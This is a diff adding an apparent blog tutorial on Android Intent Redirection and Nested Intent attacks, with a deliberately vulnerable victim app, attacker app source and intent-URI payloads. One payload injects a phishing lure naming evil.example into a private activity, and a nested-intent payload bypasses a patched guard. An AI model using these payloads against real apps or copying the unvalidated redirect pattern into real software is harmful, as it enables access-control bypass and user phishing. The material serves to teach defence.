+&lt;/table&gt;
+&lt;/div&gt;
+&lt;p&gt;Intent redirection is ultimately the victim app firing an attacker-influenced Intent somewhere with its own permissions. The sinks where this firing happens are, given the Android component structure, broadly four.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Activity: a single screen the user sees and operates. For example, in a messaging app, the conversation list screen, the conversation content screen, and the message composition screen are each an Activity. Launching an app or moving to another screen is the act of starting an Activity (startActivity).&lt;/li&gt;
+&lt;li&gt;Broadcast Receiver: a component that listens and reacts to events (broadcasts) emitted by the system or other apps. For example, when events like &amp;#x201C;boot completed,&amp;#x201D; &amp;#x201C;battery low,&amp;#x201D; or &amp;#x201C;airplane mode on&amp;#x201D; arrive, the app wakes up and handles them. For instance, an alarm app re-registers alarms after boot, or a messenger starts syncing when the network connection is restored.&lt;/li&gt;
+&lt;li&gt;Content Provider: a component that provides structured data (mainly DB/files) to other apps via &lt;code&gt;content://&lt;/code&gt; URIs. A representative example is the Contacts Provider, through which a messenger reads the user&amp;#x2019;s address book with the &amp;#x201C;contacts access permission.&amp;#x201D;&lt;/li&gt;
+&lt;li&gt;PendingIntent: a PendingIntent is not an &amp;#x201C;Intent to run right now&amp;#x201D; but an Intent token entrusted so that another process can later fire it on behalf of my app. The notification explained as an example earlier is exactly this.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-1-Hands-on&#34;&gt;&lt;a href=&#34;#2-1-Hands-on&#34; class=&#34;headerlink&#34; title=&#34;2.1. Hands-on&#34;&gt;&lt;/a&gt;2.1. Hands-on&lt;/h3&gt;&lt;p&gt;Let&amp;#x2019;s verify Intent Redirection directly through example code and apps in a hands-on manner.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;manifest&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;xmlns:android&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://schemas.android.com/apk/res/android&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;application&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;android:allowBackup&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;        &lt;span class=&#34;hljs-attr&#34;&gt;android:label&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;@string/app_name&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+        &lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!-- Launcher: run victim normally to see the legitimate screen --&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.MainActivity&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:exported&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;intent-filter&lt;/span&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;action&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;android.intent.action.MAIN&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+                &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;android.intent.category.LAUNCHER&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;intent-filter&lt;/span&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+        &lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!-- Entry point reachable by the attacker (the redirection proxy) --&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.RedirectActivity&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:exported&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;intent-filter&lt;/span&gt;&amp;gt;&lt;/span&gt;
+                &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;action&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim.REDIRECT&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+                &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;category&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;android.intent.category.DEFAULT&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;intent-filter&lt;/span&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+        &lt;span class=&#34;hljs-comment&#34;&gt;&amp;lt;!-- Should be reachable only by victim itself --&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;activity&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.SecretActivity&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;android:exported&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;false&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;application&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;manifest&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is the &lt;code&gt;AndroidManifest.xml&lt;/code&gt; used by &lt;code&gt;victim.apk&lt;/code&gt;. &lt;code&gt;AndroidManifest.xml&lt;/code&gt; is the file that specifies the access control and permissions of the app and its components. What we should look at here is that &lt;code&gt;SecretActivity&lt;/code&gt; is set to &lt;code&gt;exported=&amp;quot;false&amp;quot;&lt;/code&gt;. With this setting, only an app that has this app&amp;#x2019;s UID can access it.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; com.example.victim;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.app.Activity;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.content.Intent;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.os.Bundle;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.util.Log;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.Toast;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; java.net.URISyntaxException;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;RedirectActivity&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Activity&lt;/span&gt; &lt;/span&gt;{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String TAG = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;victim&amp;quot;&lt;/span&gt;;
+
+    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Bundle savedInstanceState)&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&#34;hljs-keyword&#34;&gt;super&lt;/span&gt;.onCreate(savedInstanceState);
+
+        String uri = getIntent().getStringExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;redirect_uri&amp;quot;&lt;/span&gt;);
+        Log.i(TAG, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;redirect_uri = &amp;quot;&lt;/span&gt; + uri);
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (uri != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) {
+            &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+                Intent forward = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
+                startActivity(forward);   &lt;span class=&#34;hljs-comment&#34;&gt;// vuln&lt;/span&gt;
+            } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (URISyntaxException e) {
+                Log.e(TAG, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;bad redirect_uri&amp;quot;&lt;/span&gt;, e);
+                Toast.makeText(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Invalid payload: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+            } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (Exception e) {
+                Log.e(TAG, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;startActivity failed&amp;quot;&lt;/span&gt;, e);
+                Toast.makeText(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Launch failed: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+            }
+        }
+        finish();
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This source code is the part where the vulnerability exists. Because there is a statement that fires the intent without validation via &lt;code&gt;startActivity(forward);&lt;/code&gt;, Intent Redirection occurs.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; com.example.victim;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.app.Activity;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.os.Bundle;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.TextView;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;SecretActivity&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Activity&lt;/span&gt; &lt;/span&gt;{
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String NOTICE =
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[Notice] System maintenance is scheduled today at 18:00.&amp;quot;&lt;/span&gt;;
+
+    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Bundle savedInstanceState)&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&#34;hljs-keyword&#34;&gt;super&lt;/span&gt;.onCreate(savedInstanceState);
+
+        String extra = getIntent().getStringExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;append&amp;quot;&lt;/span&gt;);
+
+        String shown = NOTICE;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (extra != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;) {
+            shown = NOTICE + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt; + extra;
+        }
+
+        TextView tv = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; TextView(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; pad = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;) (&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt; * getResources().getDisplayMetrics().density);
+        tv.setPadding(pad, pad, pad, pad);
+        tv.setTextIsSelectable(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;);
+        tv.setText(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SecretActivity (exported=false)\n\n&amp;quot;&lt;/span&gt; + shown);
+        setContentView(tv);
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This part is the restricted internal activity we saw earlier in &lt;code&gt;AndroidManifest.xml&lt;/code&gt;. As originally intended, it prints only a hardcoded string on the screen. However, it receives an intent with the app&amp;#x2019;s permissions, and because this too has no caller validation, when Intent Redirection occurs the input value is additionally printed as well.&lt;/p&gt;
+&lt;p&gt;The following is the source code of &lt;code&gt;attacker.apk&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;package&lt;/span&gt; com.example.attacker;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.app.Activity;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.content.Intent;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.os.Bundle;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.view.View;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.Button;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.EditText;
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; android.widget.Toast;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;MainActivity&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Activity&lt;/span&gt; &lt;/span&gt;{
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String VICTIM_PKG = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim&amp;quot;&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String REDIRECT_ACTIVITY = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim.RedirectActivity&amp;quot;&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String SECRET_ACTIVITY = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim.SecretActivity&amp;quot;&lt;/span&gt;;
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; String SAMPLE_PAYLOAD =
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;intent:#Intent;component=com.example.victim/.SecretActivity;&amp;quot;&lt;/span&gt;
+            + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;S.append=* Re-authenticate at http://evil.example for security;end&amp;quot;&lt;/span&gt;;
+
+    &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Bundle savedInstanceState)&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&#34;hljs-keyword&#34;&gt;super&lt;/span&gt;.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;final&lt;/span&gt; EditText payload = findViewById(R.id.payload);
+        payload.setText(SAMPLE_PAYLOAD);
+
+        Button send = findViewById(R.id.btn_send);
+        send.setOnClickListener(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; View.OnClickListener() {
+            &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+            &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onClick&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(View v)&lt;/span&gt; &lt;/span&gt;{
+                String text = payload.getText().toString();
+                Intent i = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Intent(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;com.example.victim.REDIRECT&amp;quot;&lt;/span&gt;);
+                i.setClassName(VICTIM_PKG, REDIRECT_ACTIVITY);
+                i.putExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;redirect_uri&amp;quot;&lt;/span&gt;, text);
+                &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+                    startActivity(i);
+                } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (Exception e) {
+                    Toast.makeText(MainActivity.&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Send failed: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+                }
+            }
+        });
+
+        Button direct = findViewById(R.id.btn_direct);
+        direct.setOnClickListener(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; View.OnClickListener() {
+            &lt;span class=&#34;hljs-meta&#34;&gt;@Override&lt;/span&gt;
+            &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;onClick&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(View v)&lt;/span&gt; &lt;/span&gt;{
+                &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+                    Intent i = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Intent();
+                    i.setClassName(VICTIM_PKG, SECRET_ACTIVITY);
+                    startActivity(i);
+                    Toast.makeText(MainActivity.&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Launched directly (unexpected)&amp;quot;&lt;/span&gt;, Toast.LENGTH_LONG).show();
+                } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (SecurityException e) {
+                    Toast.makeText(MainActivity.&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Direct launch denied: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+                } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (Exception e) {
+                    Toast.makeText(MainActivity.&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Direct launch failed: &amp;quot;&lt;/span&gt; + e.getMessage(), Toast.LENGTH_LONG).show();
+                }
+            }
+        });
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This source code is the part that sends the input value. To trigger Intent Redirection, it was written to target the hidden &lt;code&gt;SECRET_ACTIVITY&lt;/code&gt; in &lt;code&gt;victim.apk&lt;/code&gt;. In addition, a button was also made to check what happens when an intent is sent with &lt;code&gt;attacker.apk&lt;/code&gt;&amp;#x2018;s permissions.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Screen_recording_20261123_173334.gif&#34; alt=&#34;Screen recording&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This is the result of the hands-on using &lt;code&gt;attacker.apk&lt;/code&gt; and &lt;code&gt;victim.apk&lt;/code&gt;. In &lt;code&gt;victim.apk&lt;/code&gt;, a hardcoded string is printed by default. And because it is &lt;code&gt;exported=&amp;quot;false&amp;quot;&lt;/code&gt;, you can see that &lt;code&gt;attacker.apk&lt;/code&gt; cannot access that activity directly.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs fortran&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;intent&lt;/span&gt;:#&lt;span class=&#34;hljs-keyword&#34;&gt;Intent&lt;/span&gt;;component=com&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;example&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;victim/&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;SecretActivity;S&lt;span class=&#34;hljs-number&#34;&gt;.&lt;/span&gt;append=INJECTED;&lt;span class=&#34;hljs-keyword&#34;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, if you send an Intent message containing the message above, Intent Redirection occurs and this can be bypassed. The entity that calls &lt;code&gt;startActivity(forward)&lt;/code&gt;, the vulnerability identified earlier, is the victim process (victim UID). So the permission check of system_server, which performs basic UID validation, sees caller UID == target UID and allows the launch of the non-exported activity &lt;code&gt;SecretActivity&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Through this, the malicious string entered by the attacker was inserted, and we can confirm that a phishing scenario that lures the user into accessing a malicious URL is possible.&lt;/p&gt;
+&lt;h2 id=&#34;3-Nested-Intent&#34;&gt;&lt;a href=&#34;#3-Nested-Intent&#34; class=&#34;headerlink&#34; title=&#34;3. Nested Intent&#34;&gt;&lt;/a&gt;3. Nested Intent&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As the name implies, a Nested Intent means an Intent object in which multiple Intents exist in a nested state. It is a method of putting a completed Intent object into another Intent&amp;#x2019;s extra as a Parcelable and sending it, and making the victim app take it out and execute it as is.&lt;/p&gt;
+&lt;p&gt;Apps often put an Intent inside an Intent to pass along the next screen to open after a screen transition. Returning to the original screen after login, resuming work after a permission request, and routing proxy Activities are representative examples. Since &lt;code&gt;Intent&lt;/code&gt; is &lt;code&gt;Parcelable&lt;/code&gt;, it can be placed directly via &lt;code&gt;putExtra(&amp;quot;next&amp;quot;, innerIntent)&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This too, as a hands-on, let&amp;#x2019;s check what happens if we change the earlier hands-on into a nested intent.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;Intent forward = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (Guard.isAllowed(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, forward)) {     &lt;span class=&#34;hljs-comment&#34;&gt;// patch&lt;/span&gt;
+    Log.i(TAG, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[parseUri] allowed -&amp;gt; &amp;quot;&lt;/span&gt; + Guard.describe(forward));
+    launch(forward, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;parseUri&amp;quot;&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As a patch for the earlier Intent Redirection, &lt;code&gt;victim.apk&lt;/code&gt; changes, as above, to take out and execute the Intent object from the extra instead of a string.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;Intent inner = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Intent();
+inner.setClassName(VICTIM_PKG, SECRET_ACTIVITY);
+inner.putExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;append&amp;quot;&lt;/span&gt;, INJECTED);
+
+Intent outer = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Intent(ACTION_REDIRECT);
+outer.setClassName(VICTIM_PKG, REDIRECT_ACTIVITY);
+outer.putExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;forward_intent&amp;quot;&lt;/span&gt;, inner);
+send(outer);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To bypass this, &lt;code&gt;attacker.apk&lt;/code&gt; writes the payload into the inner Intent in nested intent form. And it composes a normal intent in the outer Intent extra, nesting the intents.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Screen_recording_20261123_215017.gif&#34; alt=&#34;Screen recording&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When you run the hands-on, you can confirm that Intent Redirection is blocked by the patch. However, when you send a payload made as a nested intent, you can confirm that the exploit works well. Like this, a nested intent can bypass two main things.&lt;/p&gt;
+&lt;p&gt;The first is the app&amp;#x2019;s input validation. Looking only at the outer Intent it appears normal, but the attack payload is wrapped as a Parcel inside the extra, so it passes the scheme/host/action whitelist check on the basis of the outer Intent. Until the victim app takes it out with &lt;code&gt;getParcelableExtra()&lt;/code&gt;, the inner Intent is just an opaque lump of parcel bytes.&lt;/p&gt;
+&lt;p&gt;The second is the &lt;code&gt;android:exported=&amp;quot;false&amp;quot;&lt;/code&gt; access restriction. If you set the inner Intent&amp;#x2019;s component to the victim app&amp;#x2019;s private Activity, the victim app calls &lt;code&gt;startActivity()&lt;/code&gt; with its own UID, so the permission check passes.&lt;/p&gt;
